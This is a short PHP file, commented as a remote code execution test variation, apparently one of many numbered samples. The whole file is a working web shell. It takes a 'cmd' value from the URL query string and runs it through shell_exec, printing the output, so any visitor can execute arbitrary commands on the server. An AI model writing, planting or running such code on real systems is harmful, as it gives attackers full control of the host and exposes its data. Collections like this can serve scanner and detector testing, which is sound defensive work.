<?php
// RCE test variation #1316
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>